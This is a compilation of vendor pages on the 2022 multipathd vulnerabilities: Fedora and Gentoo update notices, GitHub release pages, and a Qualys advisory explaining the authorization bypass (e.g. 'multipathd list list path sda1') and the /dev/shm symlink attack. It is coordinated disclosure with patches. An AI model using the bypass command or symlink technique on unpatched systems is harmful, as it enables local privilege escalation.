* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV.mbox.gz?message=QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/#QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV)

# [SECURITY] Fedora 36 Update: device-mapper-multipath-0.8.7-9.fc36

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

10 Nov
2022

10 Nov
'22

4:19 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2022-6ec78b2586
2022-11-10 16:17:54.575869
--------------------------------------------------------------------------------

Name : device-mapper-multipath
Product : Fedora 36
Version : 0.8.7
Release : 9.fc36
URL : <http://christophe.varoqui.free.fr/>
Summary : Tools to manage multipath devices using device-mapper
Description :
device-mapper-multipath provides tools to manage multipath devices by
instructing the device-mapper multipath kernel module what to do.
The tools are :
\* multipath - Scan the system for multipath devices and assemble them.
\* multipathd - Detects when paths fail and execs multipath to update things.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2022-41973 and CVE-2022-41974
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 26 2022 Benjamin Marzinski bmarzins@redhat.com - 0.8.7-9
- Add 0040-multipathd-ignore-duplicated-multipathd-command-keys.patch
\* Fixes bz #2137414
- Add 0041-multipath-tools-use-run-instead-of-dev-shm.patch
\* Fixes bz #2137416
- Resolves: bz #2137414, #2137416
\* Tue Aug 23 2022 Benjamin Marzinski bmarzins@redhat.com - 0.8.7-8.1
- Add 0038-multipathd-Add-missing-ctype-include.patch
- Add 0039-multipathd-replace-libreadline-with-libedit.patch
\* replace readline with libedit, to avoid license conflicts. readline
is licensed GPL v3, and multipathd includes code licensed gpl v2
only.
- Require libedit instead of readline
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2123894 - CVE-2022-41973 device-mapper-multipath: Symlink attack multipathd operates insecurely, as root, in /dev/shm (a sticky, world-writable directory similar to /tmp)
<https://bugzilla.redhat.com/show_bug.cgi?id=2123894>
[ 2 ] Bug #2133988 - CVE-2022-41974 device-mapper-multipath: Authorization bypass, multipathd daemon listens for client connections on an abstract Unix socket
<https://bugzilla.redhat.com/show_bug.cgi?id=2133988>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2022-6ec78b2586' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV/#QIGZM5NOOMFDCITOLQEJNNX5SCRQLQVV)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from security.gentoo.org_f6485358_20250114_193145.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# multipath-tools: Multiple Vulnerabilities — GLSA **202311-06**

Multiple vulnerabilities have been discovered in multipath-tools, the worst of which can lead to root privilege escalation.

### Affected packages

| Package | **sys-fs/multipath-tools** on all architectures |
| --- | --- |
| Affected versions | < **0.9.3** |
| Unaffected versions | >= **0.9.3** |

### Background

multipath-tools are used to drive the Device Mapper multipathing driver.

### Description

Multiple vulnerabilities have been discovered in multipath-tools. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All multipath-tools users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-fs/multipath-tools-0.9.3"

```
### References

* [CVE-2022-41973](https://nvd.nist.gov/vuln/detail/CVE-2022-41973)
* [CVE-2022-41974](https://nvd.nist.gov/vuln/detail/CVE-2022-41974)

**Release date**

November 25, 2023

**Latest revision**

November 25, 2023: 1

**Severity**

high

**Exploitable**

local

**Bugzilla entries**

* [878763](https://bugs.gentoo.org/show_bug.cgi?id=878763)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from packetstormsecurity.com_f293dabd_20250114_193135.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_2ce9d996_20250114_193139.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopensvc%2Fmultipath-tools%2Freleases%2Ftag%2F0.9.2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopensvc%2Fmultipath-tools%2Freleases%2Ftag%2F0.9.2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=opensvc%2Fmultipath-tools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[opensvc](/opensvc)
/
**[multipath-tools](/opensvc/multipath-tools)**
Public

* [Notifications](/login?return_to=%2Fopensvc%2Fmultipath-tools) You must be signed in to change notification settings
* [Fork
  49](/login?return_to=%2Fopensvc%2Fmultipath-tools)
* [Star
   60](/login?return_to=%2Fopensvc%2Fmultipath-tools)

* [Code](/opensvc/multipath-tools/tree/0.9.2)
* [Issues
  9](/opensvc/multipath-tools/issues)
* [Pull requests
  1](/opensvc/multipath-tools/pulls)
* [Actions](/opensvc/multipath-tools/actions)
* [Projects
  0](/opensvc/multipath-tools/projects)
* [Security](/opensvc/multipath-tools/security)
* [Insights](/opensvc/multipath-tools/pulse)

Additional navigation options

* [Code](/opensvc/multipath-tools/tree/0.9.2)
* [Issues](/opensvc/multipath-tools/issues)
* [Pull requests](/opensvc/multipath-tools/pulls)
* [Actions](/opensvc/multipath-tools/actions)
* [Projects](/opensvc/multipath-tools/projects)
* [Security](/opensvc/multipath-tools/security)
* [Insights](/opensvc/multipath-tools/pulse)

[Releases](/opensvc/multipath-tools/releases)
[Tags](/opensvc/multipath-tools/tags)

# 0.9.2

* [0.9.2](/opensvc/multipath-tools/tree/0.9.2)
* [`66664cd`](/opensvc/multipath-tools/commit/66664cdb52f548b821b2ea28e49613c068e9375d)
* Verified

  # Verified

  This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
  The key has expired.

  GPG key ID: 4AEE18F83AFDEB23
  Expired

  [Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits)
* Compare

  Choose a tag to compare

  Could not load tags

  Nothing to show

  [{{ refName }}
  default](/opensvc/multipath-tools/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...0.9.2)

   Loading

  [View all tags](/opensvc/multipath-tools/tags)

[0.9.2: Merge pull request #46 from openSUSE/queue](/opensvc/multipath-tools/releases/tag/0.9.2)

* [0.9.2](/opensvc/multipath-tools/tree/0.9.2)
* [`66664cd`](/opensvc/multipath-tools/commit/66664cdb52f548b821b2ea28e49613c068e9375d)
* Compare

  Choose a tag to compare

  Could not load tags

  Nothing to show

  [{{ refName }}
  default](/opensvc/multipath-tools/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...0.9.2)

   Loading

  [View all tags](/opensvc/multipath-tools/tags)
* Verified

  # Verified

  This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
  The key has expired.

  GPG key ID: 4AEE18F83AFDEB23
  Expired

  [Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits)

![@cvaroqui](https://avatars.githubusercontent.com/u/17934877?s=40&v=4)
[cvaroqui](/cvaroqui)
tagged this
24 Oct 07:38

```
multipath-tools 0.9.2, with fixes for CVE-2022-41973 and CVE-2022-41974
```

 Assets
2

 Loading

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.qualys.com_22d80a39_20250115_114630.html ===

Qualys Security Advisory
Leeloo Multipath: Authorization bypass and symlink attack in multipathd
(CVE-2022-41974 and CVE-2022-41973)
========================================================================
Contents
========================================================================
Summary
CVE-2022-41974: Authorization bypass
CVE-2022-41973: Symlink attack
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
We discovered two local vulnerabilities (an authorization bypass and a
symlink attack) in multipathd, a daemon that is running as root in the
default installation of (for example) Ubuntu Server:
https://ubuntu.com/server/docs/device-mapper-multipathing-introduction
https://github.com/opensvc/multipath-tools
We combined these two vulnerabilities with a third vulnerability, in
another package that is also installed by default on Ubuntu Server, and
obtained full root privileges on Ubuntu Server 22.04; other releases are
probably also exploitable. We will publish this third vulnerability, and
the complete details of this local privilege escalation, in an upcoming
advisory.
The authorization bypass (CVE-2022-41974) was introduced in February
2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check
on IPC commands"), but earlier versions perform no authorization checks
at all: any unprivileged local user can issue any privileged command to
multipathd.
The symlink attack (CVE-2022-41973) was introduced in May 2018 (version
0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in
/dev/shm"); the vulnerable code was hardened significantly in May 2020
(version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it
remains exploitable nonetheless.
========================================================================
CVE-2022-41974: Authorization bypass
========================================================================
The multipathd daemon listens for client connections on an abstract Unix
socket (conveniently, the multipathd binary itself can act as a client,
if executed with non-option arguments; we use this feature extensively
in this advisory to connect and send commands to the multipathd daemon):
------------------------------------------------------------------------
$ ps -ef | grep 'multipath[d]'
root 377 1 0 13:55 ? 00:00:00 /sbin/multipathd -d -s
$ ss -l -x | grep 'multipathd'
u\_str LISTEN 0 4096 @/org/kernel/linux/storage/multipathd 18105
------------------------------------------------------------------------
The commands sent by a client to multipathd are composed of keywords,
and internally, each keyword is identified by a different bit; for
example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which
requires a parameter) is 65536 (1<<16):
------------------------------------------------------------------------
155 load\_keys (void)
...
163 r += add\_key(keys, "list", LIST, 0);
164 r += add\_key(keys, "show", LIST, 0);
165 r += add\_key(keys, "add", ADD, 0);
...
183 r += add\_key(keys, "path", PATH, 1);
------------------------------------------------------------------------
53 #define LIST (1ULL << \_\_LIST)
54 #define ADD (1ULL << \_\_ADD)
..
69 #define PATH (1ULL << \_\_PATH)
------------------------------------------------------------------------
6 enum {
7 \_\_LIST, /\* 0 \*/
8 \_\_ADD,
..
23 \_\_PATH,
------------------------------------------------------------------------
In turn, each command is associated with a handler (a C function) by its
fingerprint -- the bitwise OR of its constituent keywords; for example,
the command "list path PARAM" is associated with cli\_list\_path() by the
fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM"
is associated with cli\_add\_path() by the fingerprint 65538
(ADD+PATH=2+65536):
------------------------------------------------------------------------
1522 void init\_handler\_callbacks(void)
....
1527 set\_handler\_callback(LIST+PATH, cli\_list\_path);
....
1549 set\_handler\_callback(ADD+PATH, cli\_add\_path);
------------------------------------------------------------------------
321 static uint64\_t
322 fingerprint(const struct \_vector \*vec)
...
325 uint64\_t fp = 0;
...
331 vector\_foreach\_slot(vec, kw, i)
332 fp += kw->code;
333
334 return fp;
------------------------------------------------------------------------
89 static struct handler \*
90 find\_handler (uint64\_t fp)
..
95 vector\_foreach\_slot (handlers, h, i)
96 if (h->fingerprint == fp)
97 return h;
98
99 return NULL;
------------------------------------------------------------------------
When multipathd receives a command from a client, it first performs an
authentication check and an authorization check (both at line 491):
------------------------------------------------------------------------
431 static int client\_state\_machine(struct client \*c, struct vectors \*vecs,
...
485 case CLT\_PARSE:
486 c->error = parse\_cmd(c);
487 if (!c->error) {
...
491 if (!c->is\_root && kw->code != LIST) {
492 c->error = -EPERM;
...
495 }
496 }
497 if (c->error)
...
501 else
502 set\_client\_state(c, CLT\_WORK);
...
522 case CLT\_WORK:
523 c->error = execute\_handler(c, vecs);
------------------------------------------------------------------------
- Authentication: if the client's UID (obtained from SO\_PEERCRED) is 0
(i.e., if is\_root is true), then the client is privileged; otherwise,
it is unprivileged.
- Authorization: if the client is privileged, it is allowed to execute
any commands; otherwise, only unprivileged LIST commands are allowed
(i.e., commands whose first keyword is either "list" or "show").
Attentive readers may have noticed that multipathd does not, in fact,
calculate the fingerprint of a command by bitwise-ORing its constituent
keywords, but by arithmetic-ADDing them (at line 332). While these two
operations are equivalent if no keyword is repeated, we (attackers) can
send a seemingly unprivileged command (whose first keyword is "list")
but whose fingerprint matches a privileged command (by repeating the
"list" keyword): we can exploit this flaw to bypass multipathd's
authorization check.
For example, we are not allowed to execute "add path PARAM" (whose
fingerprint is 2+65536=65538) because the first keyword is not "list",
but we are allowed to execute the equivalent "list list path PARAM"
(whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537)
because the first keyword is "list" (the multipathd daemon below replies
"blacklisted" because PARAM is an invalid path, not because the command
is denied):
------------------------------------------------------------------------
$ multipathd add path PARAM
permission deny: need to be root
$ multipathd list list path PARAM
blacklisted
------------------------------------------------------------------------
This authorization bypass greatly enlarges the attack surface of
multipathd: 34 privileged command handlers become available to local
attackers, in addition to the 23 unprivileged command handlers that are
normally available. We audited only a few of these command handlers,
because we quickly discovered a low-hanging vulnerability (a symlink
attack) in one of them.
========================================================================
CVE-2022-41973: Symlink attack
========================================================================
multipathd operates insecurely, as root, in /dev/shm (a sticky,
world-writable directory similar to /tmp). The vulnerable code (in
mark\_failed\_wwid()) may be executed during the normal lifetime of
multipathd, but a local attacker can force its execution by exploiting
the authorization bypass CVE-2022-41974; for example, by adding a
"whitelisted, unmonitored" device to multipathd:
------------------------------------------------------------------------
$ multipathd list devices | grep 'whitelisted, unmonitored'
sda1 devnode whitelisted, unmonitored
...
$ multipathd list list path sda1
fail
------------------------------------------------------------------------
This command, which is equivalent to "add path sda1", results in the
following system-call trace (strace) of the multipathd daemon:
------------------------------------------------------------------------
386 openat(AT\_FDCWD, "/dev/shm/multipath/failed\_wwids", O\_RDONLY|O\_DIRECTORY) = -1 ENOENT (No such file or directory)
387 mkdir("/dev", 0700) = -1 EEXIST (File exists)
388 mkdir("/dev/shm", 0700) = -1 EEXIST (File exists)
389 mkdir("/dev/shm/multipath", 0700) = 0
390 mkdir("/dev/shm/multipath/failed\_wwids", 0700) = 0
391 openat(AT\_FDCWD, "/dev/shm/multipath/failed\_wwids", O\_RDONLY|O\_DIRECTORY) = 12
392 getpid() = 375
393 openat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", O\_RDONLY|O\_CREAT|O\_EXCL, 0400) = 13
394 close(13) = 0
395 linkat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", 12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6", 0) = 0
396 unlinkat(12, "VBOX\_HARDDISK\_VB60265ca5-df119cb6.177", 0) = 0
397 close(12) = 0
------------------------------------------------------------------------
- at line 389, the directory "/dev/shm/multipath" is created, if it does
not exist already;
- at line 390, the directory "/dev/shm/multipath/failed\_wwids" is
created, if it does not exist already;
- at lines 391-397, the empty file
"/dev/shm/multipath/failed\_wwids/VBOX\_HARDDISK\_VB60265ca5-df119cb6" is
created, if it does not exist already (its name is the "World Wide ID"
of the added device).
multipathd is therefore vulnerable to two different symlink attacks:
1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath",
then we can create a directory named "failed\_wwids" (user root, group
root, mode 0700) anywhere in the filesystem;
2/ if we create an arbitrary symlink "/dev/shm/multipath/failed\_wwids",
then we can create a file named "VBOX\_HARDDISK\_VB60265ca5-df119cb6"
(user root, group root, mode 0400, size 0) anywhere in the filesystem.
These two symlink attacks are very weak, because we do not control the
name, user, group, mode, or contents of the directory or file that we
create; only its location. Despite these limitations, we were able to
combine multipathd's vulnerabilities (authorization bypass and symlink
attack) with a third vulnerability (in another package), and obtained
full root privileges on Ubuntu Server 22.04; we will publish this third
vulnerability in an upcoming advisory.
Side note: initially, we thought that the symlink attack 1/ would fail,
because /dev/shm is a sticky world-writable directory, and the kernel's
fs.protected\_symlinks is 1 by default; to our great surprise, however,
it succeeded. Eventually, we understood that only the final component of
a path is protected, not its intermediate components; for example, if
/tmp/foo is a symlink, then an access to /tmp/foo itself is protected,
but an access to /tmp/foo/bar is not. Interestingly, this weakness was
already pointed out in 2017 by Solar Designer, and the original
Openwall, grsecurity, and Yama protections are not affected:
https://www.openwall.com/lists/kernel-hardening/2017/06/06/74
========================================================================
Acknowledgments
========================================================================
We thank Martin Wilck and Benjamin Marzinski for their hard work on this
release, and the SUSE Security Team for their help with this disclosure.
We also thank the members of linux-distros@openwall.
========================================================================
Timeline
========================================================================
2022-08-24: Advisory sent to security@suse.
2022-10-10: Advisory and patches sent to linux-distros@openwall.
2022-10-24: Coordinated Release Date (15:00 UTC).


=== Content from github.com_b95f7683_20250115_114632.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopensvc%2Fmultipath-tools%2Fpull%2F46)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopensvc%2Fmultipath-tools%2Fpull%2F46)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=opensvc%2Fmultipath-tools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[opensvc](/opensvc)
/
**[multipath-tools](/opensvc/multipath-tools)**
Public

* [Notifications](/login?return_to=%2Fopensvc%2Fmultipath-tools) You must be signed in to change notification settings
* [Fork
  49](/login?return_to=%2Fopensvc%2Fmultipath-tools)
* [Star
   60](/login?return_to=%2Fopensvc%2Fmultipath-tools)

* [Code](/opensvc/multipath-tools)
* [Issues
  9](/opensvc/multipath-tools/issues)
* [Pull requests
  1](/opensvc/multipath-tools/pulls)
* [Actions](/opensvc/multipath-tools/actions)
* [Projects
  0](/opensvc/multipath-tools/projects)
* [Security](/opensvc/multipath-tools/security)
* [Insights](/opensvc/multipath-tools/pulse)

Additional navigation options

* [Code](/opensvc/multipath-tools)
* [Issues](/opensvc/multipath-tools/issues)
* [Pull requests](/opensvc/multipath-tools/pulls)
* [Actions](/opensvc/multipath-tools/actions)
* [Projects](/opensvc/multipath-tools/projects)
* [Security](/opensvc/multipath-tools/security)
* [Insights](/opensvc/multipath-tools/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopensvc%2Fmultipath-tools%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopensvc%2Fmultipath-tools%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# multipath-tools 0.9.2, with fixes for CVE-2022-41973 and CVE-2022-41974 #46

 Merged

[cvaroqui](/cvaroqui)
merged 23 commits into
[opensvc:master](/opensvc/multipath-tools/tree/master "opensvc/multipath-tools:master")
from
[openSUSE:queue](/openSUSE/multipath-tools/tree/queue "openSUSE/multipath-tools:queue")

Oct 24, 2022

 Merged

# [multipath-tools 0.9.2, with fixes for CVE-2022-41973 and CVE-2022-41974](#top) #46

[cvaroqui](/cvaroqui)
merged 23 commits into
